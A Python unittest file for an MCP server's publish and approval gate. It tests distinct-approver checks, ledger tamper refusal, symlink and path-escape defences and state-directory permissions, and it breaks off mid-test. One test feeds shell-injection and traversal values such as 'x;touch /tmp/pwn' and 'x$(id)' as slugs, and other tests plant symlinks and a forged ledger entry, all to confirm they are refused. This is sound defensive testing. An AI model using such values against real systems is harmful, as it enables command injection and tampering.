"""Publish gate tests for the MCP server: approve_proposal, merge=true on the
propose_* tools, reject_proposal and revert_proposal share one gate
(MCP_ALLOW_APPROVE, approver rights by stable id, distinct approver checked
against the server's proposals ledger, git identities as a secondary check).

Standard library only, no network: git runs against a local bare origin in
a temp dir, and every `gh` (forge) and `cargo` call is stubbed.

    python3 -m unittest discover -s mcp -p 'test_*.py'
"""
from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import os
import re
import shlex
import subprocess
import sys
import tempfile
import types
import unittest
from pathlib import Path
from unittest import mock

_HERE = Path(__file__).resolve().parent
_spec = importlib.util.spec_from_file_location("pcms_server_under_test", _HERE / "server.py")
assert _spec is not None and _spec.loader is not None
srv = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(srv)

_REAL_RUN = subprocess.run

PEOPLE = {
    login: {"login": login, "name": login.capitalize(),
            "email": f"{login}@example.com", "id": f"github:{n}",
            "source": f"test:{login}"}
    for n, login in enumerate(("alice", "bob", "carol", "dave"), 1)
}
APPROVERS = "github:1,github:2,github:3"  # alice, bob, carol; dave is not one

GATE_ENV = ("MCP_ALLOW_APPROVE", "PCMS_TRANSPORT", "REQUIRE_DISTINCT_APPROVER",
            "MCP_APPROVERS", "MCP_ALLOW_SELF_REVERT", "PCMS_STATE_DIR")


def _git_env(name: str, email: str) -> dict[str, str]:
    return {"GIT_AUTHOR_NAME": name, "GIT_AUTHOR_EMAIL": email,
            "GIT_COMMITTER_NAME": name, "GIT_COMMITTER_EMAIL": email}


def _who(login: str) -> dict[str, str]:
    return _git_env(PEOPLE[login]["name"], PEOPLE[login]["email"])


class GateCase(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="pcms-gate-test-"))
        self.addCleanup(lambda: _REAL_RUN(["rm", "-rf", str(self.tmp)]))
        # Isolated git: no user or system config, hooks or signing.
        base_env = {k: v for k, v in os.environ.items() if k not in GATE_ENV}
        base_env.update({"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1",
                         "PCMS_STATE_DIR": str(self.tmp / "state")})
        env_patch = mock.patch.dict(os.environ, base_env, clear=True)
        env_patch.start()
        self.addCleanup(env_patch.stop)

        self.origin = self.tmp / "origin.git"
        self.work = self.tmp / "work"
        self.git(None, "init", "-q", "--bare", "-b", "main", str(self.origin))
        self.git(None, "clone", "-q", str(self.origin), str(self.work))
        self.git(self.work, "switch", "-q", "-c", "main")
        (self.work / "README").write_text("site\n")
        self.git(self.work, "add", "README")
        self.git(self.work, "commit", "-q", "-m", "init", who="dave")
        self.git(self.work, "push", "-q", "-u", "origin", "main")

        root_patch = mock.patch.object(srv, "ROOT", self.work)
        root_patch.start()
        self.addCleanup(root_patch.stop)

        self.gh_calls: list[list[str]] = []
        self.cargo_calls: list[dict] = []
        self.cargo_result = lambda cmd, kw: subprocess.CompletedProcess(cmd, 0, "", "")

        def fake_run(cmd, *a, **kw):
            if isinstance(cmd, list) and cmd and cmd[0] == "gh":
                self.gh_calls.append(list(cmd))
                out = ""
                if cmd[1:3] == ["pr", "list"]:
                    out = json.dumps([{"number": 7}])
                elif cmd[1:3] == ["pr", "create"]:
                    out = "https://forge.example.com/pr/7\n"
                return subprocess.CompletedProcess(cmd, 0, out, "")
            if isinstance(cmd, list) and cmd[:1] == ["cargo"]:
                cwd = Path(kw.get("cwd") or ".")
                self.cargo_calls.append({"cmd": list(cmd), "cwd": cwd,
                                         "env": dict(kw.get("env") or os.environ),
                                         "build.rs": (cwd / "build.rs").exists()})
                return self.cargo_result(cmd, kw)
            return _REAL_RUN(cmd, *a, **kw)
            return _REAL_RUN(cmd, *a, **kw)

        run_patch = mock.patch.object(srv.subprocess, "run", fake_run)
        run_patch.start()
        self.addCleanup(run_patch.stop)

    # ---- helpers -------------------------------------------------------

    def git(self, cwd: Path | None, *args: str, who: str | None = None,
            env: dict[str, str] | None = None) -> str:
        full = {**os.environ, **(_who(who) if who else {}), **(env or {})}
        cmd = ["git", *(["-C", str(cwd)] if cwd else []), *args]
        res = _REAL_RUN(cmd, capture_output=True, text=True, env=full)
        if res.returncode != 0:
            raise AssertionError(f"{cmd}: {res.stderr}")
        return res.stdout.strip()

    def branch(self, slug: str) -> str:
        branch = f"agent/{slug}"
        self.git(self.work, "switch", "-q", "-c", branch, "main")
        self.git(self.work, "switch", "-q", "main")
        return branch

    def commit_on(self, branch: str, who: str, name: str, *, server: bool = True,
                  git_ident: dict[str, str] | None = None,
                  actor: str | None = None) -> str:
        """One commit on `branch`, pushed. server=True records it in the
        ledger the way the server's propose/revise tools do; server=False is
        a commit pushed directly, outside the server."""
        self.git(self.work, "switch", "-q", branch)
        (self.work / name).write_text(f"{name} by {who}\n")
        self.git(self.work, "add", name)
        self.git(self.work, "commit", "-q", "-m", name,
                 env=git_ident if git_ident is not None else _who(who))
        sha = self.git(self.work, "rev-parse", "HEAD")
        self.git(self.work, "push", "-q", "-u", "origin", branch)
        self.git(self.work, "switch", "-q", "main")
        if server:
            srv._ledger_append({"event": "commit", "tool": "propose_change",
                                "branch": branch, "sha": sha,
                                "actor": actor or PEOPLE[who]["id"],
                                "email": PEOPLE[who]["email"]})
        return sha

    def proposal(self, slug: str, *authors: str) -> str:
        branch = self.branch(slug)
        for i, who in enumerate(authors):
            self.commit_on(branch, who, f"{slug}-{i}.md")
        return branch

    def shipped(self, slug: str, *authors: str, merger: str = "carol",
                subject: str | None = None) -> str:
        """A proposal merged into main the way the forge merges a PR."""
        branch = self.proposal(slug, *authors)
        self.git(self.work, "merge", "-q", "--no-ff", branch, "-m",
                 subject or f"Merge pull request #7 from example/{branch}", who=merger)
        self.git(self.work, "push", "-q", "origin", "main")
        return self.origin_main()

    def origin_main(self) -> str:
        return self.git(None, "--git-dir", str(self.origin), "rev-parse", "main")

    @contextlib.contextmanager
    def as_user(self, who: str | dict, transport: str = "http", **env: str):
        ident = dict(PEOPLE[who]) if isinstance(who, str) else dict(who)
        overrides = dict(env)
        if transport == "http":
            overrides["PCMS_TRANSPORT"] = "http"
            overrides.setdefault("MCP_APPROVERS", APPROVERS)
        with mock.patch.dict(os.environ, overrides):
            if transport == "http":
                token = srv._HTTP_IDENTITY.set(ident)
                try:
                    yield
                finally:
                    srv._HTTP_IDENTITY.reset(token)
            else:
                # stdio: identity comes from the cached gh session.
                with mock.patch.object(srv, "_GH_IDENTITY_CACHE", ident):
                    yield

    def merges(self) -> list[list[str]]:
        return [c for c in self.gh_calls if c[1:3] == ["pr", "merge"]]

    def approve(self, slug: str) -> dict:
        return srv.tool_approve_proposal({"slug": slug, "deploy": False})

    def revert(self, slug: str) -> dict:
        return srv.tool_revert_proposal({"slug": slug, "deploy": False})


class MergeTrueTest(GateCase):
    def test_author_cannot_self_merge_via_merge_true(self) -> None:
        calls = {
            "propose_change": {"slug": "hello", "title": "Hello", "body": "hi"},
            "propose_template": {"name": "card", "body": "{% block content %}{% endblock %}"},
            "propose_plugin": {"name": "pixel", "snippet": "<script></script>"},
        }
        for tool, args in calls.items():
            with self.subTest(tool=tool), self.as_user("alice", MCP_ALLOW_APPROVE="1"):
                with self.assertRaisesRegex(ValueError, "refused over HTTP"):
                    srv.HANDLERS[tool]({**args, "merge": True})
            with self.subTest(tool=tool, transport="stdio"), \
                    self.as_user("alice", transport="stdio", REQUIRE_DISTINCT_APPROVER="1"):
                with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                    srv.HANDLERS[tool]({**args, "merge": True})
        self.assertEqual(self.gh_calls, [], "a refused merge must not reach the forge")
        heads = self.git(None, "--git-dir", str(self.origin), "branch", "--list", "agent/*")
        self.assertEqual(heads, "", "a refused merge must not push a branch")

    def test_approval_off_blocks_merge_true(self) -> None:
        for env in ({}, {"MCP_ALLOW_APPROVE": "1"}):
            with self.subTest(env=env), self.as_user("alice", **env):
                with self.assertRaisesRegex(ValueError, "refused over HTTP"):
                    srv.tool_propose_change({"slug": "hello", "body": "hi", "merge": True})
        with self.as_user("alice", transport="stdio", MCP_ALLOW_APPROVE="0"):
            with self.assertRaisesRegex(ValueError, "merging is disabled"):
                srv.tool_propose_change({"slug": "hello", "body": "hi", "merge": True})
        self.assertEqual(self.gh_calls, [])


class LedgerTest(GateCase):
    def test_server_commit_is_recorded_and_gates_approval(self) -> None:
        with self.as_user("alice"):
            out = srv.tool_propose_change({"slug": "hello", "title": "Hello", "body": "hi"})
        branch = out["branch"]
        head = self.git(None, "--git-dir", str(self.origin), "rev-parse", branch)
        entries = srv._ledger_entries()
        self.assertEqual([(e["event"], e["branch"], e["sha"], e["actor"]) for e in entries],
                         [("commit", branch, head, "github:1")])
        with self.as_user("alice", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                self.approve("hello")
        with self.as_user("bob", MCP_ALLOW_APPROVE="1"):
            self.assertEqual(self.approve("hello")["count"], 1)
        merges = [e for e in srv._ledger_entries() if e["event"] == "merge"]
        self.assertEqual([(e["branch"], e["pr"], e["actor"]) for e in merges],
                         [(branch, 7, "github:2")])

    def test_ledger_write_failure_fails_the_proposal(self) -> None:
        blocker = self.tmp / "not-a-dir"
        blocker.write_text("")
        with self.as_user("alice", PCMS_STATE_DIR=str(blocker)):
            with self.assertRaisesRegex(ValueError, "ledger write failed"):
                srv.tool_propose_change({"slug": "hello", "body": "hi"})
        heads = self.git(None, "--git-dir", str(self.origin), "branch", "--list", "agent/*")
        self.assertEqual(heads, "", "nothing is pushed when the ledger cannot record it")

    def test_tamper_non_server_commit_is_refused(self) -> None:
        branch = self.proposal("post-a", "alice")
        self.commit_on(branch, "dave", "extra.md", server=False)
        with self.as_user("carol", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "not made through the server"):
                self.approve("post-a")
        self.assertEqual(self.merges(), [])

    def test_no_ledger_is_refused(self) -> None:
        self.commit_on(self.branch("bare"), "alice", "a.md", server=False)
        with self.as_user("carol", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "not made through the server"):
                self.approve("bare")

    def test_malformed_ledger_is_refused(self) -> None:
        self.proposal("post-a", "alice")
        with open(srv._ledger_path(), "a") as fh:
            fh.write("{not json\n")
        with self.as_user("carol", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "malformed"):
                self.approve("post-a")


class ApproveTest(GateCase):
    def test_author_cannot_approve_after_another_person_commits(self) -> None:
        self.proposal("post-a", "alice", "bob")  # bob's commit is the latest
        for who in ("alice", "bob"):
            with self.subTest(approver=who), self.as_user(who, MCP_ALLOW_APPROVE="1"):
                with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                    self.approve("post-a")
        self.assertEqual(self.merges(), [])

    def test_committer_counts_as_author(self) -> None:
        ident = {**_who("alice"), "GIT_COMMITTER_NAME": "Bob",
                 "GIT_COMMITTER_EMAIL": "bob@example.com"}
        self.commit_on(self.branch("post-b"), "alice", "x.md", git_ident=ident)
        with self.as_user("bob", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                self.approve("post-b")

    def test_p1_author_changes_profile_then_approves(self) -> None:
        """P1: the author clears their display name and email (and even
        renames the login); the stable id still matches the ledger."""
        self.commit_on(self.branch("p1"), "alice", "p1.md",
                       git_ident=_git_env("Alice Smith", "alice.smith@corp.example"))
        drifted = {"login": "alice-renamed", "name": "", "email": "",
                   "id": "github:1", "source": "test"}
        with self.as_user(drifted, MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                self.approve("p1")
        self.assertEqual(self.merges(), [])

    def test_p2_forged_git_author_is_refused(self) -> None:
        """P2: someone with push access commits as "Alice" and approves."""
        self.commit_on(self.branch("p2"), "bob", "p2.md", server=False,
                       git_ident=_git_env("Alice", "alice@example.com"))
        with self.as_user("bob", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "not made through the server"):
                self.approve("p2")
        self.assertEqual(self.merges(), [])

    def test_p12_unit_separator_in_name_does_not_hide_a_commit(self) -> None:
        """P12: a git name containing 0x1f used to drop the commit from the
        author set. Parsing is NUL-separated and fails closed now."""
        eve = {"login": "eve", "name": "E\x1fve", "email": "eve@example.com",
               "id": "github:5", "source": "test"}
        branch = self.branch("p12")
        self.commit_on(branch, "alice", "p12.md", actor="github:5",
                       git_ident=_git_env("E\x1fve", "eve@example.com"))
        people = srv._people_of(srv._commits(f"main..{branch}"))
        self.assertIn(("E\x1fve", "eve@example.com"), people)
        with self.as_user(eve, MCP_ALLOW_APPROVE="1", MCP_APPROVERS="github:5"):
            with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                self.approve("p12")
        self.assertEqual(self.merges(), [])

    def test_p7_missing_origin_main_is_refused(self) -> None:
        """P7: with origin/main gone, a local main that already contains
        the branch must not yield an empty author set and a pass."""
        branch = self.proposal("p7", "alice")
        self.git(self.work, "merge", "-q", "--ff-only", branch)
        self.git(self.work, "update-ref", "-d", "refs/remotes/origin/main")
        self.git(self.work, "remote", "set-url", "origin", str(self.tmp / "gone.git"))
        with self.as_user("alice", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "origin/main"):
                self.approve("p7")
        self.assertEqual(self.merges(), [])

    def test_valid_approver_approves_pinned_to_checked_head(self) -> None:
        branch = self.proposal("post-a", "alice", "bob")
        head = self.git(self.work, "rev-parse", branch)
        with self.as_user("carol", MCP_ALLOW_APPROVE="1"):
            out = self.approve("post-a")
        self.assertEqual(out["count"], 1)
        self.assertEqual(len(self.merges()), 1)
        self.assertIn("--match-head-commit", self.merges()[0])
        self.assertIn(head, self.merges()[0])

    def test_approvers_match_stable_ids_only(self) -> None:
        self.proposal("post-a", "alice")
        for listed in ("carol", "carol@example.com", "Carol"):
            with self.subTest(listed=listed), \
                    self.as_user("carol", MCP_ALLOW_APPROVE="1", MCP_APPROVERS=listed):
                with self.assertRaisesRegex(ValueError, "not an approver"):
                    self.approve("post-a")
        with self.as_user("dave", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "not an approver"):
                self.approve("post-a")
        self.assertEqual(self.merges(), [])

    def test_http_without_approvers_refuses_approve_reject_revert(self) -> None:
        self.proposal("post-a", "alice")
        self.shipped("post-b", "alice")
        with self.as_user("carol", MCP_ALLOW_APPROVE="1", MCP_APPROVERS=""):
            with self.assertRaisesRegex(ValueError, "no approver is configured"):
                self.approve("post-a")
            with self.assertRaisesRegex(ValueError, "no approver is configured"):
                srv.tool_reject_proposal({"slug": "post-a", "reason": "no"})
            with self.assertRaisesRegex(ValueError, "no approver is configured"):
                self.revert("post-b")
        self.assertEqual(self.gh_calls, [])

    def test_require_distinct_off_does_not_relax_http(self) -> None:
        self.proposal("post-a", "alice")
        with self.as_user("alice", MCP_ALLOW_APPROVE="1", REQUIRE_DISTINCT_APPROVER="0"):
            with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                self.approve("post-a")

    def test_stdio_single_user_may_approve_own_proposal(self) -> None:
        self.proposal("post-a", "alice")
        with self.as_user("alice", transport="stdio"):
            self.assertEqual(self.approve("post-a")["count"], 1)
        with self.as_user("alice", transport="stdio", REQUIRE_DISTINCT_APPROVER="1"):
            with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                self.approve("post-a")


class RevertTest(GateCase):
    def test_approval_off_blocks_revert(self) -> None:
        before = self.shipped("post-a", "alice")
        for env in ({}, {"MCP_ALLOW_APPROVE": "0"}):
            with self.subTest(env=env), self.as_user("carol", **env):
                with self.assertRaisesRegex(ValueError, "merging is disabled"):
                    self.revert("post-a")
        self.assertEqual(self.origin_main(), before)

    def test_revert_by_non_approver_is_refused(self) -> None:
        before = self.shipped("post-a", "alice")
        with self.as_user("dave", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "not an approver"):
                self.revert("post-a")
        self.assertEqual(self.origin_main(), before)
        self.assertEqual(self.gh_calls, [])

    def test_revert_by_change_author_is_refused(self) -> None:
        before = self.shipped("post-a", "alice", "bob")
        for who in ("alice", "bob"):
            for env in ({}, {"REQUIRE_DISTINCT_APPROVER": "0"}):
                with self.subTest(who=who, env=env), \
                        self.as_user(who, MCP_ALLOW_APPROVE="1", **env):
                    with self.assertRaisesRegex(ValueError, "MCP_ALLOW_SELF_REVERT"):
                        self.revert("post-a")
        self.assertEqual(self.origin_main(), before)

    def test_revert_of_change_with_non_server_commits_is_refused(self) -> None:
        branch = self.proposal("post-a", "alice")
        self.commit_on(branch, "carol", "raw.md", server=False)
        self.git(self.work, "merge", "-q", "--no-ff", branch,
                 "-m", f"Merge pull request #7 from example/{branch}", who="bob")
        self.git(self.work, "push", "-q", "origin", "main")
        before = self.origin_main()
        with self.as_user("carol", MCP_ALLOW_APPROVE="1", MCP_ALLOW_SELF_REVERT="1"):
            with self.assertRaisesRegex(ValueError, "not made through the server"):
                self.revert("post-a")
        self.assertEqual(self.origin_main(), before)

    def test_valid_approver_reverts(self) -> None:
        before = self.shipped("post-a", "alice", merger="bob")
        with self.as_user("carol", MCP_ALLOW_APPROVE="1"):
            out = self.revert("post-a")
        self.assertTrue(out["reverted"])
        self.assertNotIn("break_glass", out)
        self.assertEqual(self.git(None, "--git-dir", str(self.origin),
                                  "rev-parse", "main~1"), before)

    def test_p6_slug_never_matches_as_substring(self) -> None:
        """P6: slug "p6" used to revert the merge of agent/p6-other."""
        before = self.shipped("p6-other", "alice", merger="dave")
        with self.as_user("carol", MCP_ALLOW_APPROVE="1"):
            with self.assertRaisesRegex(ValueError, "no merge commit found"):
                self.revert("p6")
        self.assertEqual(self.origin_main(), before)

    def test_revert_finds_merge_by_ledger_record(self) -> None:
        before = self.shipped("post-a", "alice", subject="Merge branch work")
        srv._ledger_append({"event": "merge", "tool": "approve_proposal",
                            "branch": "agent/post-a", "pr": 9, "sha": before,
                            "actor": "github:2", "email": ""})
        with self.as_user("carol", MCP_ALLOW_APPROVE="1"):
            out = self.revert("post-a")
        self.assertEqual((out["merge_commit"], out["pr"], out["branch"]),
                         (before, 9, "agent/post-a"))

    def test_break_glass_self_revert_is_logged(self) -> None:
        self.shipped("post-a", "alice")
        err = io.StringIO()
        with self.as_user("alice", MCP_ALLOW_APPROVE="1", MCP_ALLOW_SELF_REVERT="1"), \
                contextlib.redirect_stderr(err):
            out = self.revert("post-a")
        self.assertTrue(out["reverted"])
        self.assertEqual(out["break_glass"], "MCP_ALLOW_SELF_REVERT")
        self.assertIn("BREAK-GLASS", err.getvalue())
        self.assertIn("github:1", err.getvalue())
        comments = [c for c in self.gh_calls if c[1:3] == ["pr", "comment"]]
        self.assertTrue(any("Break-glass" in " ".join(c) for c in comments))

    def test_stdio_single_user_may_revert_own_change(self) -> None:
        self.shipped("post-a", "alice")
        with self.as_user("alice", transport="stdio"):
            out = self.revert("post-a")
        self.assertTrue(out["reverted"])
        self.assertNotIn("break_glass", out)


class SharedCheckoutTest(GateCase):
    """L4b: a proposal whose commit fails must not leave its files staged
    for the next caller's commit; worktrees are per call over HTTP."""

    def propose(self, who: str, slug: str, transport: str = "http") -> dict:
        with self.as_user(who, transport=transport):
            return srv.tool_propose_change({"slug": slug, "title": slug, "body": "b"})

    def files_of(self, branch: str) -> list[str]:
        return self.git(None, "--git-dir", str(self.origin), "show", "--name-only",
                        "--format=", branch).split()

    def failing_commit(self, lock: Path | None = None):
        real = srv._git

        def g(*a, **kw):
            if a and a[0] == "commit":
                if lock is None:
                    return subprocess.CompletedProcess(a, 128, "", "fatal: index.lock exists")
                lock.write_text("")  # a concurrent git op holds the index lock
                try:
                    return real(*a, **kw)
                finally:
                    lock.unlink()
            return real(*a, **kw)
        return mock.patch.object(srv, "_git", g)

    def worktrees(self) -> list[str]:
        out = self.git(self.work, "worktree", "list", "--porcelain")
        return [l for l in out.splitlines() if l.startswith("worktree ")]

    def test_l4b_http_failed_commit_leaves_nothing_for_the_next_caller(self) -> None:
        with self.failing_commit():
            with self.assertRaisesRegex(ValueError, "git commit failed"):
                self.propose("bob", "bobstage")
        self.assertEqual(self.git(self.work, "diff", "--cached", "--name-only"), "")
        self.assertEqual(len(self.worktrees()), 1, "throwaway worktree removed")
        self.assertEqual(list((self.work / ".tenants").glob(".work-*")), [])
        out = self.propose("alice", "later")
        self.assertEqual(self.files_of(out["branch"]),
                         ["content/posts/later/index.mdx", "content/posts/later/meta.yaml"])
        self.assertEqual(len(self.worktrees()), 1)

    def test_l4b_stdio_shared_checkout_commits_only_its_own_paths(self) -> None:
        with self.failing_commit(lock=self.work / ".git" / "index.lock"):
            with self.assertRaisesRegex(ValueError, "git commit failed"):
                self.propose("bob", "bobstage", transport="stdio")
        self.assertEqual(self.git(self.work, "diff", "--cached", "--name-only"), "",
                         "the failed proposal's files are unstaged")
        # Even something staged by hand in the shared checkout stays out.
        (self.work / "stray.md").write_text("stray\n")
        self.git(self.work, "add", "stray.md")
        out = self.propose("alice", "later", transport="stdio")
        self.assertEqual(self.files_of(out["branch"]),
                         ["content/posts/later/index.mdx", "content/posts/later/meta.yaml"])
        self.assertIn("stray.md", self.git(self.work, "diff", "--cached", "--name-only"))

    def test_ledger_refuses_a_commit_outside_the_tools_paths(self) -> None:
        branch = self.branch("mixed")
        self.git(self.work, "switch", "-q", branch)
        before = self.git(self.work, "rev-parse", "HEAD")
        for f in ("mine.md", "theirs.md"):
            (self.work / f).write_text(f)
        self.git(self.work, "add", "mine.md", "theirs.md")
        self.git(self.work, "commit", "-q", "-m", "mixed", who="alice")
        with self.assertRaisesRegex(ValueError, "outside its own.*theirs.md"):
            srv._ledger_record_commit("propose_change", branch, self.work, before,
                                      PEOPLE["alice"], ["mine.md"])
        self.assertEqual(srv._ledger_entries(), [])

    def test_http_ignores_tenant_and_uses_a_fresh_worktree(self) -> None:
        with self.as_user("alice"):
            out = srv.tool_propose_change({"slug": "t1", "body": "b", "tenant": "team"})
        self.assertIn("tenant_ignored", out)
        self.assertFalse((self.work / ".tenants" / "team").exists())
        self.assertEqual(len(self.worktrees()), 1)


class LedgerStorageTest(GateCase):
    """L6: the ledger never follows a symlink, and its state dir must be a
    real 0700 directory owned by the server user."""

    def entry(self) -> dict:
        return {"event": "commit", "tool": "t", "branch": "agent/b",
                "sha": "e" * 40, "actor": "github:1"}

    def test_l6_symlinked_ledger_is_refused(self) -> None:
        state = Path(os.environ["PCMS_STATE_DIR"])
        state.mkdir(mode=0o700)
        planted = self.tmp / "planted.jsonl"
        planted.write_text(json.dumps({"v": 1, "event": "commit", "tool": "x",
                                       "branch": "agent/q", "sha": "d" * 40,
                                       "actor": "github:3"}) + "\n")
        os.symlink(planted, srv._ledger_path())
        with self.assertRaisesRegex(ValueError, "ledger"):
            srv._ledger_append(self.entry())
        with self.assertRaisesRegex(ValueError, "without following links"):
            srv._ledger_entries()
        self.assertEqual(planted.read_text().count("\n"), 1, "planted file untouched")

    def test_l6_state_dir_must_be_private_and_real(self) -> None:
        state = Path(os.environ["PCMS_STATE_DIR"])
        state.mkdir(mode=0o700)
        os.chmod(state, 0o755)
        with self.assertRaisesRegex(ValueError, "0700"):
            srv._ledger_append(self.entry())
        os.chmod(state, 0o700)
        real = self.tmp / "real-state"
        real.mkdir(mode=0o700)
        link = self.tmp / "link-state"
        os.symlink(real, link)
        with mock.patch.dict(os.environ, {"PCMS_STATE_DIR": str(link)}):
            with self.assertRaisesRegex(ValueError, "not a real directory"):
                srv._ledger_append(self.entry())

    def test_ledger_created_private(self) -> None:
        srv._ledger_append(self.entry())
        self.assertEqual(os.stat(os.environ["PCMS_STATE_DIR"]).st_mode & 0o777, 0o700)
        self.assertEqual(os.stat(srv._ledger_path()).st_mode & 0o777, 0o600)


class BranchContentTest(GateCase):
    """A proposal branch's content belongs to whoever can push it: revise
    must never follow its symlinks, run its code, or reach server state."""

    def item_branch(self, slug: str, link_target: Path | None = None,
                    extra: dict[str, str] | None = None) -> str:
        branch = f"agent/{slug}"
        self.git(self.work, "switch", "-q", "-c", branch, "main")
        d = self.work / "content" / "posts" / slug
        d.mkdir(parents=True)
        (d / "meta.yaml").write_text(f'title: "{slug}"\nslug: "{slug}"\npublished: false\n')
        if link_target is not None:
            os.symlink(str(link_target), d / "index.mdx")
        else:
            (d / "index.mdx").write_text("body\n")
        for rel, text in (extra or {}).items():
            (self.work / rel).parent.mkdir(parents=True, exist_ok=True)
            (self.work / rel).write_text(text)
        self.git(self.work, "add", "-A")
        self.git(self.work, "commit", "-q", "-m", slug, who="dave")
        self.git(self.work, "push", "-q", "origin", branch)
        self.git(self.work, "switch", "-q", "main")
        return branch

    def revise(self, slug: str, body: str) -> dict:
        with self.as_user("bob"):
            return srv.tool_revise_proposal({"slug": slug, "feedback": "x", "body": body})

    def test_s1_revise_never_writes_through_a_symlink(self) -> None:
        victim = self.tmp / "outside-victim.txt"
        victim.write_text("original\n")
        self.item_branch("s1", link_target=victim)
        with self.assertRaisesRegex(ValueError, "symlink"):
            self.revise("s1", "PWNED\n")
        self.assertEqual(victim.read_text(), "original\n")

    def test_s2_revise_cannot_reach_the_ledger(self) -> None:
        with self.as_user("alice"):
            srv.tool_propose_change({"slug": "real", "title": "real", "body": "b"})
        ledger = srv._ledger_path()
        before = ledger.read_text()
        self.item_branch("s2", link_target=ledger)
        forged = json.dumps({"v": 1, "event": "commit", "tool": "propose_change",
                             "branch": "agent/x", "sha": "f" * 40, "actor": "github:999"})
        with self.assertRaisesRegex(ValueError, "symlink"):
            self.revise("s2", forged + "\n")
        self.assertEqual(ledger.read_text(), before)
        self.assertNotIn("github:999", [e["actor"] for e in srv._ledger_entries()])

    def test_symlink_in_a_directory_component_is_refused(self) -> None:
        outside = self.tmp / "outside-dir"
        outside.mkdir()
        with self.assertRaisesRegex(ValueError, "symlink"):
            os.symlink(outside, self.work / "content-link")
            srv._wt_write(self.work, "content-link/x.md", "x")
        self.assertEqual(list(outside.iterdir()), [])

    def test_revise_refuses_a_branch_that_changes_other_paths(self) -> None:
        self.item_branch("s5", extra={"crates/build/build.rs": "fn main() {}\n"})
        with self.assertRaisesRegex(ValueError, "outside content/posts/s5"):
            self.revise("s5", "new\n")

    def test_revise_of_a_clean_branch_works_and_is_recorded(self) -> None:
        self.item_branch("ok")
        out = self.revise("ok", "new body\n")
        self.assertTrue(out["revised"])
        self.assertEqual([(e["branch"], e["actor"]) for e in srv._ledger_entries()],
                         [("agent/ok", "github:2")])

    def test_s3_rename_out_of_another_path_is_refused(self) -> None:
        (self.work / "other.txt").write_text("x\n" * 50)
        self.git(self.work, "add", "other.txt")
        self.git(self.work, "commit", "-q", "-m", "o", who="dave")
        before = self.git(self.work, "rev-parse", "HEAD")
        (self.work / "content/posts/r").mkdir(parents=True)
        self.git(self.work, "mv", "other.txt", "content/posts/r/meta.yaml")
        self.git(self.work, "commit", "-q", "-m", "rename", who="alice")
        with self.assertRaisesRegex(ValueError, "outside its own.*other.txt"):
            srv._ledger_record_commit("propose_change", "agent/r", self.work, before,
                                      PEOPLE["alice"], ["content/posts/r"])

    def test_slug_and_collection_injection_is_refused(self) -> None:
        bad = ["x;touch /tmp/pwn", "x$(id)", "a b", "../x", "-x", "x" * 65, "x\ny", ""]
        with self.as_user("alice", MCP_ALLOW_APPROVE="1"):
            for value in bad:
                with self.subTest(slug=value):
                    with self.assertRaisesRegex(ValueError, "must match"):
                        srv.tool_propose_change({"slug": value, "body": "b"})
                    with self.assertRaisesRegex(ValueError, "must match"):
                        srv.tool_revise_proposal({"slug": value, "body": "b"})
                    with self.assertRaisesRegex(ValueError, "must match"):
                        self.approve(value)
                    with self.assertRaisesRegex(ValueError, "must match"):
                        self.revert(value)
                if not value:
                    continue  # an empty collection means the default, posts
                with self.subTest(collection=value):
                    with self.assertRaisesRegex(ValueError, "must match"):
                        srv.tool_propose_change({"slug": "ok", "collection": value,
                                                 "body": "b"})
        self.assertEqual(self.gh_calls, [])

    def test_preview_command_quotes_every_value(self) -> None:
        with self.as_user("alice"):
            out = srv.tool_propose_change({"slug": "q_1", "body": "b"})
        cmd = out["preview_command"]
        self.assertIn(shlex.quote(str(self.work)), cmd)
        self.assertIn(f"git switch {shlex.quote(out['branch'])}", cmd)


class StateDirTest(GateCase):
    def entry(self) -> dict:
        return {"event": "commit", "tool": "t", "branch": "agent/b",
                "sha": "e" * 40, "actor": "github:1"}

    def test_http_requires_an_explicit_state_dir(self) -> None:
        with mock.patch.dict(os.environ, {"PCMS_TRANSPORT": "http"}):
            os.environ.pop("PCMS_STATE_DIR")
            with self.assertRaisesRegex(ValueError, "PCMS_STATE_DIR is required"):
                srv.check_state_dir()
            with self.assertRaisesRegex(ValueError, "ledger write failed"):
                srv._ledger_append(self.entry())

    def test_state_dir_inside_the_repo_or_a_worktree_is_refused(self) -> None:
        self.git(self.work, "worktree", "add", "-q", "--detach",
                 str(self.tmp / "wt2"), "main")
        for inside in (self.work / ".tenants" / ".state", self.tmp / "wt2" / "state",
                       "relative/state"):
            with self.subTest(dir=str(inside)), \
                    mock.patch.dict(os.environ, {"PCMS_STATE_DIR": str(inside)}):
                with self.assertRaisesRegex(ValueError, "inside|absolute"):
                    srv.check_state_dir()

    def test_stdio_default_is_outside_the_repo(self) -> None:
        with mock.patch.dict(os.environ, {"XDG_STATE_HOME": str(self.tmp / "xdg")}):
            os.environ.pop("PCMS_STATE_DIR")
            d = srv.check_state_dir()
        self.assertEqual(d.parent, self.tmp / "xdg" / "post-cms")
        self.assertEqual(os.stat(d).st_mode & 0o777, 0o700)


class WorktreeLimitsTest(GateCase):
    def test_worktree_cap_returns_busy(self) -> None:
        with mock.patch.dict(os.environ, {"PCMS_MAX_WORKTREES": "1"}):
            held = srv._add_work_worktree(
